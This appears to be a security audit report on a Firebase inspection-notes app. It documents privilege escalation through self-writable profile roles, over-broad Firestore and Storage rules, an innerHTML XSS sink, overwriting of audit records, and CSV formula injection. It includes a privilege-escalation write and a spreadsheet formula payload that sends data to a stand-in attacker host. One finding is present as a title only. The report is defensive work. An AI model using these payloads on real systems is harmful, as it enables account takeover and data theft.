findings.title: Users can write their own profile document, and the profile is what the rules read for role and organisation membership
findings.class: Privilege escalation through self-writable authorization data
findings.evidence: Line 31 is `allow write: if request.auth.uid == uid` — unconditional on the document's contents, so a signed-in user may set any field of their own profile. The same document is the authorization source for the rest of the file: profile() at lines 10-12 reads it, role() at lines 14-16 returns its role field, and memberOf(orgId) at lines 18-20 tests membership against its orgs array. Those feed the org rules at lines 42-43 and 46, and the audit read at line 52. The legitimate writer confirms the fields are ordinary document data with no server-side authority: web/src/auth.js:24-31 writes role and orgs from the client at first sign-in.
findings.impact: A user issues one client-side write of `{role: 'admin', orgs: ['victim-org']}` to profiles/{their-uid} and thereby grants themselves read and write on /orgs/victim-org and every document beneath it (lines 42-47), plus read of the audit trail (line 52), which the file at line 50 calls an immutable trail. No server round trip is involved: the Firestore client SDK is wired directly to the project at web/src/firebase.js:19, and the rules are the whole of the enforcement.
findings.recommendation: Stop storing authorization state where its subject can write it. Restrict the profile write to the presentational fields — `allow update: if request.auth.uid == uid && request.resource.data.diff(resource.data).affectedKeys().hasOnly(['displayName'])` — and move role and orgs to custom claims on the ID token or to a collection only the Admin SDK writes.

triage.reason: There is no layer the client cannot skip. The rules are the enforcement for direct SDK access, and the client talks to Firestore directly (web/src/firebase.js:19, used throughout web/src/notes.js). The one server-side membership check that exists, functions/index.js:47-50, reads the same self-written profile document, so it inherits the defect rather than compensating for it.
What the escalated profile unlocks is other organisations' field notes and the audit trail — inspection records and their tamper log.

The rule would apply if the write were narrower than it reads. It is not narrowed at all: line 31 has one condition, identity, and no constraint on request.resource.data, so every field including role and orgs is inside it.

scope.established_by: Following every reader of the profile document: profile() at line 11 is called by role() (line 15) and memberOf() (line 19); role() is used at lines 43 and 52; memberOf() at lines 42, 43 and 46. functions/index.js:47-48 reads the same collection independently for its membership check. That is the complete set of decisions made from self-writable data.
scope.narrowed_by: fieldnotes/firestore.rules:36-38 — the top-level /notes collection is scoped by resource.data.ownerId rather than by profile, so notes stored there are not reachable by editing a profile. The notes the application actually writes go to /orgs/{orgId}/notes (web/src/notes.js:19), which is inside the affected set.

findings.title: The recursive org subcollection rule grants writes to every member, overriding the admin-only rule above it
findings.evidence: Line 43 restricts writes on the org document itself to administrators: `allow write: if memberOf(orgId) && role() == 'admin'`. The nested recursive match at lines 45-47 then grants `read, write: if memberOf(orgId)` over every path beneath the org — with no role test. Firestore evaluates all matching rules and grants access if any allows it, so for every subcollection document the broad rule decides and the narrower intent above it never bites. The two rules read as a general policy plus an exception, and they behave as the general policy alone.
findings.impact: Any member of an org — the default role from web/src/auth.js:10 is 'inspector', not admin — can write every document under that org: other inspectors' field notes at /orgs/{orgId}/notes (the collection web/src/notes.js:19 writes to), the members collection that functions/index.js:75 reads, and anything else stored there. Because the note documents carry ownerId (notes.js:33), a member can also rewrite ownership, which is the field the storage rules key their own check on (storage.rules:9).
findings.recommendation: Split the recursive match by operation and by collection: keep `allow read: if memberOf(orgId)` recursive if broad reads are intended, and give writes their own narrower matches per subcollection — notes constrained to resource.data.ownerId == request.auth.uid, members constrained to the admin role.

triage.reason: Nothing sits between the client and this rule. The web application uses the Firestore client SDK directly (web/src/firebase.js:19; writes at notes.js:31, :45, :52), so the rules file is the enforcement, and within it the broader grant wins by the union semantics of the language.

A second principal exists inside the same org: notes belong to individual inspectors (ownerId, notes.js:33) and the top-level /notes rules at lines 36-38 show the intended per-owner boundary. This rule erases that boundary between colleagues.

I checked the reading that would rescue it — that a nested match might be constrained by its parent. Firestore rules do not work that way: the nested match is evaluated independently and its allow is a union with, not an intersection of, the parent's. The neighbouring blocks in the same file rely on that union semantics too.

scope.established_by: Reading the four match blocks in the file and identifying which paths each governs: /catalog, /profiles, /notes and /orgs with its recursive child. The recursive child at line 45 is the only one whose pattern subsumes documents another rule in the file also addresses.
scope.narrowed_by: fieldnotes/firestore.rules:42-43 — the org document itself is matched by the parent block as well, but since access is granted if any rule allows, that narrowing does not take effect for the subcollections. There is no effective narrowing, which is the finding.

findings.title: Storage allows any authenticated user to overwrite any note attachment
findings.class: Function-level authorization gap between operations on one object
findings.evidence: Within a single match block, three of four operations check ownership through noteOwner() — read at line 12, create at lines 14-17 and delete at line 22 — and update at line 20 checks only `request.auth != null`. Create additionally bounds the object: under 15 MB (line 16) and a content type matching image/* or application/pdf (line 17). Update carries neither. The comment at line 19 gives the intent — re-uploading a photo after the inspector rotates or crops it — which explains why update exists and not why it dropped all three conditions its sibling create holds.
findings.impact: Any signed-in user overwrites any inspection attachment in any organisation: replacing evidence photographs on another org's field note, uploading an object of unbounded size (a cost and availability problem), or storing arbitrary content types — including HTML, which on the Firebase storage download origin is served to whoever follows the link that notes.js:63 persists onto the note as lastAttachment.
findings.recommendation: Give update the same predicate as create — `request.auth != null && noteOwner() == request.auth.uid && request.resource.size < 15 * 1024 * 1024 && request.resource.contentType.matches('image/.*|application/pdf')`. Since create and update differ only in whether the object already exists, they should carry identical conditions.

triage.reason: Storage rules are the enforcement for the client SDK path, and that is the path the application uses: web/src/notes.js:60-61 calls uploadBytes against a ref built from orgId, noteId and file.name, with no server hop. Nothing else can intervene.

A second principal is explicit in the same block: noteOwner() at lines 8-10 exists to distinguish the owning inspector from everyone else, and read, create and delete all use it. Update is the one operation that does not.

There is no reading on which update reaches a lesser effect than create — both write the object bytes at the same path. The exports match at lines 25-27 shows the file's author does write narrow rules deliberately when that is the intent.

scope.established_by: Enumerating the operations in each of the two match blocks in the file and comparing their predicates: the exports block (lines 25-27) denies everything, and within the notes block read/create/delete all call noteOwner() while update does not. The asymmetry is decidable inside the one block.
scope.narrowed_by: fieldnotes/storage.rules:20 — the caller must be authenticated, so this is not open to anonymous users. That is the whole of the narrowing; it does not restrict which org, note or file.

findings.title: The organisation export callable checks neither authentication nor membership
findings.class: Missing authorization on a privileged export

findings.title: The shared-note view assigns the note body to innerHTML
findings.evidence: Line 39 is `article.innerHTML = note.body`. Every other value in the same function is set safely: the heading uses textContent at line 30, and both metadata fields go through field(), which uses textContent at lines 9 and 11. So the function's author applied the safe sink four times and the unsafe one once. note.body is stored raw — web/src/notes.js:31-40 writes body straight from the caller with no sanitisation, and there is no sanitiser anywhere in the tree (grep for DOMPurify, sanitize and bleach across fieldnotes returns nothing). The page runs on the application's own origin with the viewer's Firebase session available, so the payload can drive the client SDK as that user: read their notes, and given EHS-42, rewrite their profile. Reach is widened by EHS-43, under which any org member can author the body of any note in the org.

If the rich-text requirement is real, run the body through a strict allowlist sanitiser before assigning it; if it is not, use textContent as the four neighbouring assignments do. An allowlist on write is not sufficient on its own here, because notes.js is not the only writer — the Firestore client SDK path means anything with write access to the document sets the field directly.

triage.reason: No sanitiser exists on any path to this sink: notes.js:31-40 and :45-48 write body unchanged, and no CSP is declared — fieldnotes/firebase.json:10-15 sets Cache-Control on js and css and no other header.
body originates from the note author through createNote (web/src/notes.js:29) or updateNote (line 44), both plain client writes with no constraint on content.
innerHTML is the parsing sink, not a text sink: it parses the assigned string as HTML into the live document. The same file demonstrates the non-executing alternative at lines 9, 11 and 30.

scope.established_by: The client-sink enumeration across the tree returned one innerHTML assignment, this line. Tracing note.body backwards gives the two writers in web/src/notes.js and no sanitiser between them and the sink.

findings.title: The seal endpoint writes audit documents at a caller-chosen id with set(), overwriting the immutable trail
findings.class: Object identifier from the request body / audit tampering
findings.evidence: The audit id is composed from the request body: line 60 normalises orgId and seq out of req.body and line 61 builds `const auditId = ${orgId}_${seq}`. Line 62 then writes with `db.doc('audits/'+auditId).set({...})` — set() replaces an existing document rather than failing, unlike create(). The handler performs no membership check on the orgId it is given: contrast the sibling three handlers above it, where api.get('/notes/recent') loads the caller's profile and returns 403 unless orgId is in their orgs (lines 47-50). It also does not verify that noteId belongs to that org. firestore.rules:51-54 sets `allow write: if false` on /audits and calls it an immutable trail written by the audit function with the Admin SDK — and the Admin SDK at line 8 is exactly what bypasses that rule.
findings.impact: Any authenticated user overwrites any existing audit record by naming its org and sequence — replacing sealedBy with their own uid and sealedAt with the current time, and repointing noteId. The record the rules describe as immutable is rewritable by every holder of a valid ID token, which defeats the trail as evidence. The same call also fabricates seals for organisations the caller has nothing to do with.
findings.recommendation: Do not take the identifier from the body. Derive the audit id server-side (a generated id, or a transactional counter), use create() so an existing document causes a failure rather than a silent replacement, and apply the membership check from lines 47-50 to the orgId before writing.

triage.reason: Both components of the id come from the request body via normalizeRequest (line 60): orgId is req.body.orgId stripped of characters outside [A-Za-z0-9_-] (line 34) and seq is Number(req.body.seq) (line 35). Neither is derived from the authenticated principal.

The audits collection is the tamper-evidence trail — firestore.rules:50 describes it as immutable and lines 52 restrict reads to admins and auditors, so the project treats it as the record of who sealed what.
Nothing narrows which audit documents are reachable. The sanitiser at line 34 constrains the character set of orgId but not its value, so any existing org's records can be named.

scope.established_by: The WEB-25 question asked of each request field that names another row: orgId and seq together name an audits document. Tracing what happens to the named row gives set() at line 62, which replaces it. The membership check that the sibling handler applies to the same orgId field was found by comparing the two handlers, lines 46-50 against 60-62.
scope.narrowed_by: fieldnotes/functions/index.js:43 — api.use(requireIdToken) does cover this route, so the caller must hold a valid Firebase ID token. That is the one control present, and it authenticates without authorizing.

findings.title: The org export builds CSV by joining raw fields, allowing formula injection and field corruption
findings.evidence: Line 97 is `[doc.id, note.ownerId, note.status, note.title, note.body].join(',')` and line 100 joins the rows with newlines. There is no quoting, no escaping and no neutralisation of leading formula characters. title and body are user-authored (web/src/notes.js:29-40, no constraint on content), so a title beginning `=`, `+`, `-` or `@` is a formula, and one containing a comma or a newline breaks the row structure. The client hands the result straight to a download: web/src/share.js:45-50 wraps it in a text/csv blob and clicks an anchor with a .csv filename.
findings.impact: A note title of `=HYPERLINK("https://attacker.example?d="&A1,"open")` or an equivalent DDE construct executes or exfiltrates when the exported file is opened in a spreadsheet by whoever downloads the org export — typically a supervisor. Low, because it requires the victim to open the file and accept the spreadsheet's own warning prompt, and because the payload's author must already be able to write notes in that org. The structural half is more mundane and more certain: any comma in a title silently shifts every subsequent column.
findings.recommendation: Build the CSV properly — quote every field, double any embedded quote — and prefix a value beginning with =, +, - or @ with an apostrophe or a space so a spreadsheet treats it as text. A serialiser rather than a join is the durable fix.

triage.reason: title and body are free-text fields written by the client at web/src/notes.js:31-40 with no schema, no length bound and no character restriction anywhere between there and line 97.

The sink is a CSV consumed by a spreadsheet: web/src/share.js:45 constructs the blob with type 'text/csv' and line 49 names the download with a .csv extension, which is what causes a spreadsheet application to interpret leading formula characters rather than display them.

The rule asks about the data's value, and here the concern is the payload the data carries into the consuming application rather than its confidentiality — the exported rows are inspection records with named owners in any case.

scope.established_by: The one producer of CSV in the tree is line 97-100; grep for csv across fieldnotes returns that function and its consumer, downloadOrgCsv at web/src/share.js:43-52, which is the only place the string reaches a file.
scope.narrowed_by: fieldnotes/functions/index.js:94 — the export covers one org's notes at a time, so the payload must be authored inside the org whose export is opened. Given EHS-43, any member of that org can author it.
